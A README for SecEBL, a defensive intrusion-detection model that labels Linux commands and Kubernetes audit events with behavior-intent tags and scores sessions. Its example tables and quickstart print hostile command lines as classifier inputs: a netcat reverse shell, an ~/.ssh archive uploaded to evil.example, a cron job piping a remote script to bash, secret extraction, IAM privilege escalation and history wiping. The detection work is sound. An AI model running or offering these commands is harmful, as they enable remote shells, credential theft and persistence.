# SecEBL

**SecEBL** stands for **Security Event Behavior Labeler**.

SecEBL is an intent-recognition layer for intrusion detection. It maps security
events into explicit behavior-intent labels, then lets a session layer reason
over the sequence of behaviors to detect threat intent.

The first public model family is **SecEBL-Rev20**. It is trained and evaluated
on Linux command lines and normalized Kubernetes AuditLog events, but the design
target is broader: endpoint telemetry, audit logs, cloud audit records, identity
events, container events, and other security-relevant streams.

In one sentence: SecEBL turns security telemetry into explainable behavior
intent, so detection can reason about what an actor is trying to do instead of
only matching known bad strings, fixed allow/deny lists, or opaque risk scores.

## Core Idea

Traditional IDS pipelines often depend on blacklists, allowlists, signatures,
hand-written rules, and low-explainability tabular ML. Those tools still matter.
SecEBL does **not** claim to completely replace them.

The project adds a missing layer: **intent detection**.

```text
raw security event
  -> L1 behavior-intent recognition
  -> L2 session reasoning
  -> alert / review / downstream policy
```

Embedding models are useful here because many telemetry records contain natural
language-like behavior evidence: commands, tool names, arguments, object names,
API verbs, resource paths, and audit messages. A trained embedding model can map
different surface forms into the same behavior, for example credential access,
remote execution, persistence, data staging, or cloud privilege modification.

This is especially useful for:

- LOLT / living-off-the-land behavior where the tool is legitimate but the
  intent is not.
- Rule-writing lag, where new tool syntax appears faster than signatures can be
  maintained.
- Multi-platform telemetry, where the same security behavior appears in Linux,
  Kubernetes, cloud, identity, or application audit streams with different
  syntax.
- Explainable detection, where an alert should be tied to behavior labels
  instead of an opaque model score alone.

### Why Intent Labels Matter

The practical gap SecEBL targets is not simply "classify this command as bad."
Security telemetry is full of legitimate tools used in suspicious ways and
suspicious-looking words used in normal operations. A rule can match a token, but
it often struggles to represent the behavior behind that token without becoming
too broad or too brittle.

SecEBL changes the intermediate representation:

| Traditional signal | Typical limitation | SecEBL representation |
| --- | --- | --- |
| Tool name, token, IOC, or rule hit | Easy to evade or too context-dependent. | Ranked behavior-intent tags such as `spawn_reverse_shell`, `read_credential_material`, or `query_service_health`. |
| Single event risk score | Hard to explain and hard to compose across a session. | Explicit L1 behavior evidence that L2 or another downstream system can aggregate. |
| Platform-specific syntax | Rules have to be rewritten for every log shape. | A shared behavior vocabulary that can map Linux commands, K8s audit logs, and future telemetry into comparable intents. |

This makes the model useful even when the final detection decision still uses
rules, policy, analyst review, or a separate risk engine. The breakthrough is the
middle layer: turning raw events into portable, explainable intent evidence.

## Architecture

SecEBL-Rev20 is split into two layers.

### L1: Behavior-Intent Labeler

L1 is the stable public core. It embeds an event and retrieves behavior tags
from the Rev20 schema.

L1 answers:

```text
What objective behavior is visible in this event?
```

Examples:

- `read_credential_material`
- `execute_in_workload`
- `create_scheduled_task`
- `grant_cloud_privilege`
- `upload_sensitive_content`

L1 intentionally does **not** decide that a single event is an intrusion. A
single command can be risky, benign, or ambiguous depending on sequence and
environment. L1 produces explainable behavior evidence for later reasoning.

### L2: Session Risk Scorer

L2 is an experimental session layer. It consumes cached L1 outputs and aggregates
session-level semantic features:

- tag ratios and counts
- family and marker diversity
- retrieval-score summaries
- professional / routine / operational context ratios
- behavior transitions and compact attack-chain indicators

The current maintained L2 is a lightweight logistic-regression scorer plus
semantic calibration for very long operational sessions. It is useful for
research and reproducible experiments, but it should be treated as
**experimental**, not as the final detection architecture. The intended long-term
direction is stronger sequence modeling over intent chains.

Runtime L2 does not use raw command text, user names, host names, or session ids
as scoring features. Session ids may be used by data-prep scripts to assign
review labels, but not as runtime allow/deny lists.

## What This Release Contains

This GitHub release is a compact public release of the SecEBL-Rev20 runtime and
documentation. It includes:

- the Rev20 behavior schema with 361 behavior tags;
- L1 prediction and evaluation helpers for command lines and normalized K8s
  audit events;
- an experimental L2 session scorer that consumes cached L1 outputs;
- reviewed public example data for runnable smoke tests;
- a one-command script for running the public examples on Linux, macOS, or CPU
  fallback environments.

Model weights are intentionally distributed separately on Hugging Face because
they are large: [willchen0011/SecEBL](https://huggingface.co/willchen0011/SecEBL).
The full training corpora, final benchmarks, private
pressure-stream rows, and private run logs are not redistributed because parts
of them contain real telemetry or real operational context. The public examples
prove that the release code path runs end to end; the headline quality numbers
come from the larger withheld final-gold and session-level evaluations described
below.

## Repository Layout

| Path | Purpose |
| --- | --- |
| `tags_schema_rev20.json` | Canonical Rev20 behavior vocabulary. |
| `secebl_l1/` | L1 tag prediction and gold-label evaluation helpers. |
| `secebl_l2/` | Experimental ML L2 session scorer and L2 tag-risk policy. |
| `scripts/run_examples.sh` | One-command public example-data smoke-test runner. |
| `examples/linux/` | Reviewed public Linux command-session examples and matching Rev20 gold labels. |
| `examples/k8s/` | Normalized Kubernetes AuditLog examples and matching Rev20 gold labels. |
| `pyproject.toml` | Python package metadata, dependencies, and CLI entry points. |
| `LICENSE`, `NOTICE` | Repository license and attribution notices. |

Training corpora, full final benchmarks, and private pressure-stream data are
intentionally not included in this public GitHub release because they contain
real operational context.

## Data And Vocabulary

### Rev20 Schema

Rev20 is a flat behavior-tag schema.

| Item | Count |
| --- | ---: |
| Top-level behavior groups | 12 |
| Behavior tags | 361 |

Schema groups:

| Group | Tags |
| --- | ---: |
| `observation_and_discovery` | 51 |
| `configuration_and_log_modification` | 12 |
| `filesystem_and_data` | 33 |
| `execution_and_process` | 28 |
| `network` | 51 |
| `identity_auth_and_secrets` | 31 |
| `persistence_services_and_storage` | 27 |
| `kernel_memory_and_tracing` | 14 |
| `package_build_and_source` | 19 |
| `database_and_infrastructure_services` | 33 |
| `containers_and_cloud_native` | 34 |
| `cloud_control_plane` | 28 |

The schema went through several design iterations. Earlier versions used
multi-axis labels, then a six-axis scheme. Rev20 moved to a flat
`behavior_tags[]` vocabulary because it is easier to evaluate, easier to explain,
and easier for downstream session scoring to consume. The current schema still
preserves semantic families through policy metadata.

### Training Corpus Summary

The training corpora are not included in this public repository, but the release
baseline was trained from the following internal Rev20 corpora:

| Corpus | Rows | Unique behavior tags | Notes |
| --- | ---: | ---: | --- |
| Linux command corpus | 85,277 | 361 | Mixed generated, reviewed, and manually expanded command examples. |
| Kubernetes AuditLog corpus | 1,008 | 40 | Manually authored normalized K8s audit events. |

The Linux corpus covers roughly 2,700 distinct first-token/tool forms by a
conservative executable-name estimate. Common families include shell utilities,
network tools, package/build tools, cloud CLIs, IaC tools, container tooling,
databases, secret stores, and Kubernetes tooling. Frequent examples include
`curl`, `kubectl`, `aws`, `grep`, `cat`, `systemctl`, `find`, `ssh`, `docker`,
`git`, `redis-cli`, `journalctl`, `psql`, `gcloud`, `mysql`, `az`, `nmap`,
`vault`, and `terraform`.

Top Linux corpus tags include:

| Tag | Count |
| --- | ---: |
| `stage_temporary_path` | 5,179 |
| `read_credential_material` | 4,512 |
| `read_infrastructure_config` | 3,427 |
| `upload_external_content` | 1,886 |
| `stage_hidden_path` | 1,580 |
| `search_credentials` | 1,488 |
| `modify_service_state` | 1,459 |
| `upload_sensitive_content` | 1,424 |
| `read_business_data` | 1,378 |
| `execute_remote_command` | 1,374 |

Top K8s corpus tags include:

| Tag | Count |
| --- | ---: |
| `modify_workload` | 221 |
| `enumerate_cluster_resources` | 131 |
| `modify_cluster_auth_policy` | 53 |
| `modify_route` | 49 |
| `execute_in_workload` | 47 |
| `inspect_workload` | 45 |
| `grant_cluster_privilege` | 39 |
| `modify_firewall_policy` | 38 |
| `modify_verification_material` | 37 |
| `inspect_auth_policy` | 33 |

### Public Example Data

**Important: the training corpora and full final benchmarks are not public
because parts of them contain real telemetry or real operational context. The
public `examples/` directory is only a small, reviewed subset for smoke tests
and API demonstration; it is not the full final benchmark and should not be used
as the headline evaluation set.**

The full Linux final benchmark, training corpora, private pressure-stream data,
corpus review queues, labeling scratch files, generated training tensors, and
private run logs are excluded for that reason.

| Public example artifact | Rows | Sessions | Notes |
| --- | ---: | ---: | --- |
| Linux example sessions | 1,365 | 60 | 30 complete normal sessions and 30 complete intrusion sessions selected from the withheld internal final benchmark; command text is preserved verbatim. |
| Linux example gold labels | 1,365 | 60 | Matching Rev20 behavior labels for the Linux examples. |
| K8s example sessions | 144 | 46 | Normalized Kubernetes AuditLog examples with public-only metadata. |
| K8s example gold labels | 144 | 46 | Matching Rev20 behavior labels for the K8s examples. |

The public Linux examples are intended for copy/paste verification of the L1 and
L2 code path. They are intentionally much smaller than the internal final
benchmark. Their session labels are normalized to English enums, while the
command text is kept unchanged from the selected final sessions. The internal
Linux final gold covers all 361 Rev20 behavior tags. The public K8s example gold
covers 27 K8s-relevant tags.

**Validation takeaway: the compact public examples show how to run the release,
while the reported quality numbers come from larger withheld final-gold and
session-level evaluations. Those internal final sets include dense multi-tag
commands, normal operations, intrusion chains, and pressure-stream sessions, so
they are a much stronger validation target than the public examples alone.**

Session-level `expected` and `session_expected` labels use English enums:
`intrusion` and `normal_operation`. These labels are evaluation labels, not a
substitute for production authorization, incident response, or human review.

Internal Linux final gold tag cardinality, reported for transparency:

| Tags per row | Rows |
| --- | ---: |
| 0 | 705 |
| 1 | 8,829 |
| 2 | 1,567 |
| 3 | 901 |
| 4 | 402 |
| 5 | 139 |
| 6+ | 51 |

Top internal Linux final gold tags:

| Tag | Count |
| --- | ---: |
| `stage_temporary_path` | 987 |
| `inspect_network_state` | 801 |
| `stage_hidden_path` | 655 |
| `inspect_current_identity` | 578 |
| `read_credential_material` | 551 |
| `inspect_system_state` | 481 |
| `inspect_infrastructure_service` | 390 |
| `query_dns_records` | 372 |
| `enumerate_filesystem` | 365 |
| `search_credentials` | 315 |

Top public K8s example gold tags:

| Tag | Count |
| --- | ---: |
| `modify_workload` | 20 |
| `execute_in_workload` | 19 |
| `spawn_interactive_shell` | 18 |
| `read_cluster_secret` | 17 |
| `read_workload_logs` | 11 |
| `grant_cluster_privilege` | 10 |
| `enumerate_cluster_resources` | 8 |
| `modify_cluster_auth_policy` | 7 |
| `manage_infrastructure_backup` | 7 |
| `execute_scheduled_task` | 7 |

## L1 Results

Current documented L1 baseline:

```text
featurize-rev20-20260620-072423-ep128-bs112-latestdata
```

| Dataset | Dynamic exact | Top5 any-hit | Top5 all-covered | Micro recall@5 |
| --- | ---: | ---: | ---: | ---: |
| Linux final gold | 87.32% | 98.49% | 95.44% | 96.44% |
| K8s final gold | 99.31% | 100.00% | 100.00% | 100.00% |
| Combined | 87.47% | 98.50% | 95.50% | 96.47% |

**These headline L1 metrics were measured on the withheld full final-gold
benchmark, not on the public `examples/` subset.** The Linux final gold covers
the complete 361-tag Rev20 vocabulary and includes complex multi-tag command
rows; maintaining 98.49% top5 any-hit and 96.44% micro recall@5 on that set is
the main evidence that L1 is robust beyond toy examples. The K8s number should
be read as a small-domain sanity result rather than broad Kubernetes coverage:
the current K8s corpus is much smaller than the Linux corpus and covers fewer
behavior tags. The strongest remaining L1 weakness is strict exact matching on
dense multi-tag rows. The key accuracy and performance numbers are summarized
in this README so the release can stay compact without a separate docs
directory.

### Fine-Grained Contrast Examples

These examples were scored with the public SecEBL-Rev20 release model and
calibration. Scores are cosine/retrieval scores after the release prompt profile;
the table shows top 3 labels.

| Event | Top 3 L1 tags | Note |
| --- | --- | --- |
| `nc -e /bin/sh 203.0.113.10 4444` | `spawn_reverse_shell` 0.811; `connect_external_service` 0.488; `spawn_bind_shell` 0.451 | `-e` is recognized as reverse-shell execution. |
| `nc -v 203.0.113.10 443` | `connect_external_service` 0.732; `spawn_reverse_shell` 0.503; `create_reverse_tunnel` 0.412 | Connection intent ranks above shell-spawn intent. |
| `cat /root/install.log` | `read_business_log` 0.641; `read_system_log` 0.431; `read_workload_logs` 0.385 | Log-read semantics dominate. |
| `cat /root/install.conf` | `read_infrastructure_config` 0.620; `read_system_config` 0.612; `read_kernel_parameter` 0.336 | Config-read semantics dominate. |
| `grep -a "password" /var/log/auth.log` | `read_auth_audit_log` 0.675; `search_credentials` 0.609; `read_credential_material` 0.507 | Auth-log read plus credential-search evidence. |
| `grep -v "DEBUG" /var/log/app.log` | `read_business_log` 0.824; `delete_business_log` 0.515; `read_business_config` 0.315 | Negative filter is still primarily log-read behavior. |
| `grep "password" /etc/shadow` | `search_credentials` 0.752; `read_credential_material` 0.698; `crack_credential_material` 0.296 | Shadow-file password search maps to credential access. |
| `grep "password incorrect" /var/log/auth.log` | `read_auth_audit_log` 0.731; `search_credentials` 0.548; `read_credential_material` 0.452 | Ambiguous token evidence remains; context/L2 should decide final risk. |

### Intrusion-Like Examples

| Event | Top 3 L1 tags | Why it is useful |
| --- | --- | --- |
| `tar czf /tmp/ssh.tgz ~/.ssh && curl -F file=@/tmp/ssh.tgz https://evil.example/upload` | `archive_sensitive_content` 0.521; `upload_credential_material` 0.494; `read_ssh_policy` 0.472 | Credential material staging and upload. |
| `echo "* * * * * root curl -fsSL http://evil.example/p.sh \| bash" > /etc/cron.d/sys-updater` | `create_scheduled_task` 0.789; `create_startup_script` 0.435; `execute_scheduled_task` 0.323 | Persistence via scheduled execution. |
| `kubectl -n prod get secret payment-api-token -o jsonpath={.data.token} \| base64 -d` | `read_cluster_secret` 0.730; `decode_data` 0.716; `read_credential_material` 0.363 | K8s secret extraction and decoding. |
| `aws iam attach-user-policy --user-name temp --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` | `grant_cloud_privilege` 0.838; `modify_cloud_identity_policy` 0.535; `modify_cloud_identity` 0.459 | Cloud privilege escalation semantics. |
| `history -c && rm -f ~/.bash_history` | `clear_shell_history` 0.861; `securely_delete_data` 0.428; `clear_login_history` 0.393 | Anti-forensic shell-history clearing. |

### Normal Operation Examples

| Event | Top 3 L1 tags | Why it is useful |
| --- | --- | --- |
| `dig api.internal.example.com +short` | `query_dns_records` 0.811; `enumerate_cloud_accounts` 0.351; `perform_dns_zone_transfer` 0.320 | DNS lookup is separated from broad network probing. |
| `journalctl -u nginx --since "10 minutes ago" --no-pager` | `read_infrastructure_log` 0.767; `delete_infrastructure_log` 0.395; `read_business_log` 0.271 | Service log inspection. |
| `du -sh /var/log/* \| sort -h \| tail` | `read_system_log` 0.655; `inspect_storage_state` 0.645; `modify_storage_volume` 0.368 | Storage/log inspection, not destructive behavior. |
| `docker ps --format "{{.Names}} {{.Status}}"` | `enumerate_containers` 0.821; `inspect_container_runtime` 0.540; `enumerate_workloads` 0.483 | Container inventory. |
| `curl -fsS http://127.0.0.1:8080/healthz` | `query_service_health` 0.840; `inspect_local_kubernetes_cluster` 0.459; `inspect_container_runtime` 0.383 | Local service health check. |

### Normal Maintenance / Operations Examples

| Event | Top 3 L1 tags | Why it is useful |
| --- | --- | --- |
| `systemctl restart nginx && systemctl status nginx --no-pager` | `inspect_service` 0.671; `modify_service_state` 0.669; `enable_service` 0.332 | Service restart plus verification. |
| `kubectl -n prod rollout restart deployment/payment-api` | `modify_workload` 0.799; `modify_container_state` 0.444; `inspect_workload` 0.428 | Workload rollout maintenance. |
| `pg_dump -h db.internal -U backup appdb \| gzip > /backup/appdb-$(date +%F).sql.gz` | `compress_data` 0.731; `export_database_dump` 0.682; `manage_database_backup` 0.470 | Database backup behavior. |
| `trivy image registry.internal/app/payment-api:20260621` | `scan_container_image` 0.701; `enumerate_container_images` 0.373; `inspect_container_image` 0.349 | Container image security scan. |
| `terraform plan -out tfplan && terraform show -no-color tfplan` | `plan_infrastructure_template` 0.843; `initialize_infrastructure_template` 0.368; `read_infrastructure_config` 0.353 | Infrastructure planning, not apply/destroy. |

## L1 Performance

SecEBL-Rev20 is a SentenceTransformers-style embedding retriever over 361 Rev20
tag definitions. The serving path embeds the event, embeds or loads tag
definition embeddings, then ranks tags by similarity.

Current single-card RTX 4090 recommendation:

| Setting | Value |
| --- | --- |
| Precision | FP16 |
| Attention | SDPA |
| `max_seq_length` | 160 |
| Batch size | 224 |
| Sorting | `sort_by=char` |
| Padding | dynamic, no forced pad alignment |
| Output path | GPU tensor output plus GPU top-k |

Measured on an NVIDIA GeForce RTX 4090 24GB:

| Mode | Throughput |
| --- | ---: |
| Recommended no-cache unique inference | mean 5,997.51 unique cmdlines/s |
| Recommended no-cache latency | about 0.1667 ms per unique cmdline |
| FP32 baseline | 1,917.70 - 1,934.82 cmdlines/s |
| Earlier FP16 eager GPU tensor path | 4,028.99 - 4,034.64 cmdlines/s |
| Warm exact raw-event cache lookup | mean 1,817,462.76 rows/s |
| Cold cache build over unique stream commands | 3,567.45 unique cmdlines/s |

Main optimization points:

- FP16 inference with SDPA attention.
- Keep command embeddings and tag embeddings on GPU.
- Run top-k on GPU instead of copying full embedding matrices to NumPy.
- Sort batches by command length to reduce padding waste.
- Use exact raw-event caching for repeated high-volume streams.

The cache key is the exact raw event string. Cache hits reuse the same L1 top-k
prediction and do not change model semantics.

## L2 Results

Current optimized L2 artifact:

```text
featurize-rev20-20260620-072423-ep128-bs112-latestdata-l2hn27-lenctx-semcal-20260621
```

**L2 is an experimental fitted session scorer, and its high accuracy should be
read in that exact scope.** It is optimized for the current internal experiment:
fitting a lightweight session algorithm over L1 semantic features, then checking
it against the withheld Linux final sessions and a 7M-row pressure stream. The
high session accuracy below is therefore evidence that this fitted L2 setup
works well on the current complex internal benchmark and pressure data. It is
not an independent claim of general production IDS accuracy, and it should not
be compared to L1 final-gold tag retrieval metrics.

Internal final Linux session result:

| Sessions | TP | FN | FP | TN | Attack recall | Normal recall | Attack precision |
| ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| 663 | 365 | 0 | 0 | 298 | 100.00% | 100.00% | 100.00% |

Internal 7M pressure-stream result:

| Rows | Sessions | Alert sessions | Real alert sessions | Synthetic alert sessions |
| ---: | ---: | ---: | ---: | ---: |
| 6,286,568 | 102,117 | 61 | 1 | 60 |

**The 7M pressure result is a fit-check on real background telemetry plus
embedded attack sessions, not a public benchmark.** The 61 alert sessions
include one reviewed real attack-like pressure session and 60 synthetic attack
sessions embedded in the pressure stream. The underlying pressure-stream rows
and real session identifiers are not redistributed.

L2 training/evaluation mixture:

| Item | Count |
| --- | ---: |
| L2 sessions | 5,747 |
| Positive sessions | 426 |
| Negative sessions | 5,321 |
| Synthetic pressure positive sessions | 60 |
| Reviewed real pressure positive sessions | 1 |
| Random real pressure background negative sessions | 5,000 |
| Reviewed hard-negative pressure sessions | 23 |

L2 OOF validation:

| Metric | Value |
| --- | ---: |
| Accuracy | 99.39% |
| Attack precision | 96.44% |
| Attack recall | 95.31% |
| Normal recall | 99.72% |
| TP / FN / FP / TN | 406 / 20 / 15 / 5,306 |

L2 performance, pure in-memory session state plus final scoring:

| Events | Mean throughput | Best throughput |
| ---: | ---: | ---: |
| 1,000,000 | 151,169 events/s | 159,695 events/s |

L2 is intentionally documented as experimental. It is included so users can
reproduce session-level experiments, but L1 behavior-intent recognition is the
main stable release artifact.

## Quick Start

Install the helper package:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

Download the SecEBL-Rev20 model artifact from
[Hugging Face: willchen0011/SecEBL](https://huggingface.co/willchen0011/SecEBL)
into `model_artifacts/`. The directory must contain the embedding model files
and `semantic_texts.jsonl`; if present, `score_calibration.rev20.json` is used
automatically by the helper commands.

For example:

```bash
git lfs install
git clone https://huggingface.co/willchen0011/SecEBL model_artifacts
```

### Predict Tags

Single Linux command:

```bash
secebl-predict-tags \
  --model model_artifacts \
  --data-dir model_artifacts \
  --text 'nc -e /bin/sh 203.0.113.10 4444' \
  --output runs/demo/predictions.jsonl
```

Single normalized Kubernetes AuditLog event:

```bash
secebl-predict-tags \
  --model model_artifacts \
  --data-dir model_artifacts \
  --text 'k8s_audit verb=create resource=pods subresource=exec namespace=prod requestObject=command=/bin/sh' \
  --output runs/demo/k8s_predictions.jsonl
```

JSONL input is also supported. The predictor reads the first available field in
`cmdline`, `command`, `k8slog`, `raw`, `event`, or `message`:

```bash
secebl-predict-tags \
  --model model_artifacts \
  --data-dir model_artifacts \
  --input my_events.jsonl \
  --output runs/my_events/predictions.jsonl
```

The output contains `command`, selected `behavior_tags`, and `top_labels`. This
is the cached L1 prediction format consumed by L2.

### L1 Top-K And Thresholds

L1 always starts by ranking Rev20 tags by embedding similarity. In the public
release commands, `top_labels` is the saved ranked list and defaults to top 5
labels via `--save-top-k 5`.

There are two related but different outputs:

- `top_labels`: the raw ranked evidence list. Final-gold metrics such as top5
  any-hit, top5 all-covered, micro recall@5, and dynamic exact are computed from
  this ranking. These metrics do not require a decision threshold.
- `behavior_tags`: a selected subset derived from `top_labels` by thresholding.
  The default selection uses `--min-score 0.55`, `--max-tags 4`, and
  `--multi-label-gap 0.12`; if `score_calibration.rev20.json` is present, its
  per-label/per-group thresholds are used.

The one-command example runner saves top5 rankings for evaluation and passes the
same calibration file into L2 when available. L2 then re-selects semantic tags
from the cached `top_labels` using `secebl_l2/tag_risk_policy.rev20.json` plus
calibration before building session features. In other words, L1 quality is
mainly reported as ranking quality, while thresholding is the conversion step
for selected tags and L2 session scoring.

### Run Public Examples

Run the public Linux/K8s example-data L1 path with automatic device selection.
The script uses CUDA on NVIDIA, MPS on macOS Apple Silicon when available, and
CPU otherwise:

```bash
scripts/run_examples.sh
```

Useful overrides:

```bash
MODEL_DIR=/path/to/model_artifacts \
OUT_DIR=runs/examples_mac \
DEVICE=mps \
BATCH_SIZE=64 \
scripts/run_examples.sh
```

If an L2 model is available, set `L2_MODEL` and the same script will continue
into Linux example-session scoring:

```bash
L2_MODEL=model_artifacts/l2_artifacts/logreg.joblib scripts/run_examples.sh
```

### Manual Example Commands

Generate L1 predictions for the Linux example-gold set:

```bash
secebl-predict-benchmark-tags \
  --benchmark examples/linux/example_gold.rev20.jsonl \
  --model model_artifacts \
  --data-dir model_artifacts \
  --calibration model_artifacts/score_calibration.rev20.json \
  --save-top-k 5 \
  --prompt-profile mid \
  --out-dir runs/example_gold_l1
```

Evaluate command-level example gold:

```bash
secebl-eval-gold \
  --gold examples/linux/example_gold.rev20.jsonl \
  --predictions runs/example_gold_l1/predictions.jsonl \
  --out runs/example_gold_l1/top5_tag_accuracy.json
```

Score sessions with an ML L2 artifact:

```bash
secebl-l2 score \
  --input examples/linux/example_sessions.jsonl \
  --predictions runs/example_gold_l1/predictions.jsonl \
  --risk-policy secebl_l2/tag_risk_policy.rev20.json \
  --calibration model_artifacts/score_calibration.rev20.json \
  --model model_artifacts/l2_artifacts/logreg.joblib \
  --output runs/l2/example_session_results.json
```

## License And Compliance

This GitHub repository contains code, documentation, schemas, policy metadata,
and public example data. These repository contents are Apache-2.0 unless a file
explicitly states otherwise.

Model weights are not included in this GitHub repository. SecEBL-Rev20 model
artifacts are published separately on
[Hugging Face: willchen0011/SecEBL](https://huggingface.co/willchen0011/SecEBL)
and are governed by the model license and model card distributed with that
Hugging Face release. Download the model artifact into `model_artifacts/`
before running the prediction examples.

The base model is `Alibaba-NLP/gte-modernbert-base`, which is Apache-2.0. SecEBL
adds the Rev20 schema, private training/evaluation artifacts, calibration, L1
helpers, public examples, and experimental L2 scorer.

Do not use this release as a substitute for legal, compliance, incident response,
or production authorization review. Treat model outputs as security evidence for
analysis and downstream policy, not as an autonomous enforcement decision.
